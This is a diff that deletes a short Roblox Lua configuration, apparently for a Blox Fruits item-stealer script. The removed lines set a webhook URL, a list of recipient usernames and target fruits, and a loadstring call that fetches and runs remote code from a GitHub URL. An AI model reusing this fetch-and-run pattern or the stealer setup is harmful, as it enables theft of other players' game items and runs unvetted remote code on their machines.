@@ -1,9 +1,0 @@
-Webhook =
-    "https://webhook-protect.vercel.app/api/webhook?id=TzhIaUtzYUFmaUpzdkRVelN3WVlwQTpCcDk1US1meXRELS1EXzgzdkI4dmpLVWpVcWk3UkpNdVpPY2tsN2pqU1lMcjNpSklxWEdDTEZvNzU4RXV5WUZVM01XMTlLYUdkQkozZGdvalpKSzFTN19aZWhsVDduVE9Ia3J5ZGFQTkpMUXhLZmo4a1pNWlZRWi1IeFVveG42MHhSV1lpSzd4dUNnZFpLQWtFNWtGYWJfUDg2V0d5R3NxZ181UExRcWd2Ums" -- << Your Webhook
-Usernames = {"GONNN00", "tluan93", "jaywinhall", "Robloxplayer55844", "triccolo123", "HTNTPbloxfruit", "Kiendzhehe006"} -- << Your username(-s).
-FruitsToHit = {
-    "Kitsune-Kitsune",
-    "Yeti-Yeti",
-    "Gas-Gas"} -- << Fruits you want
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
